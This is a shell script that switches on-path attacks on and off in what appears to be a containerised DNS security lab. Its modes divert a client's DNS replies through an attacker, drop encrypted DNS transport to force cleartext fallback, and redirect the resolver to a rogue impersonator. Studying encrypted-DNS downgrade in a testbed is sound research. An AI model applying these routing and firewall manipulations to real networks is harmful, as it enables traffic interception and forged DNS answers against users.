#!/bin/sh
# Shared on-path controls for the Phase 7 attacks, all applied on edge-router only.
#   divert / undivert : send client :53 replies through the attacker (cleartext forge)
#   block / unblock   : drop the encrypted transport (TCP 853/443) to force fallback
#   dnat-on / dnat-off: redirect resolver :853 to the rogue resolver (impersonation)
set -e
ATTACKER=172.16.1.100
CLIENT=172.16.1.10
REAL_RESOLVER=172.16.2.10
ROGUE_RESOLVER=172.16.2.200

case "$1" in
  divert)   docker exec edge-router ip route replace "${CLIENT}/32" via "$ATTACKER"
            echo "divert ON: client ${CLIENT} replies via attacker ${ATTACKER}" ;;
  undivert) docker exec edge-router ip route del "${CLIENT}/32" via "$ATTACKER" 2>/dev/null || true
            echo "divert OFF" ;;
  block)    docker exec edge-router iptables -I FORWARD -p tcp --dport 853 -j DROP
            docker exec edge-router iptables -I FORWARD -p tcp --dport 443 -j DROP
            echo "encrypted transport BLOCKED (tcp 853 + 443 dropped on edge-router)" ;;
  unblock)  docker exec edge-router iptables -D FORWARD -p tcp --dport 853 -j DROP 2>/dev/null || true
            docker exec edge-router iptables -D FORWARD -p tcp --dport 443 -j DROP 2>/dev/null || true
            echo "encrypted transport restored" ;;
  dnat-on)  docker exec edge-router iptables -t nat -A PREROUTING -d "$REAL_RESOLVER" -p tcp --dport 853 \
                -j DNAT --to-destination "${ROGUE_RESOLVER}:853"
            echo "impersonation ON: ${REAL_RESOLVER}:853 -> rogue ${ROGUE_RESOLVER}:853" ;;
  dnat-off) docker exec edge-router iptables -t nat -D PREROUTING -d "$REAL_RESOLVER" -p tcp --dport 853 \
                -j DNAT --to-destination "${ROGUE_RESOLVER}:853" 2>/dev/null || true
            echo "impersonation OFF" ;;
  *) echo "usage: net.sh divert|undivert|block|unblock|dnat-on|dnat-off" >&2; exit 2 ;;
esac
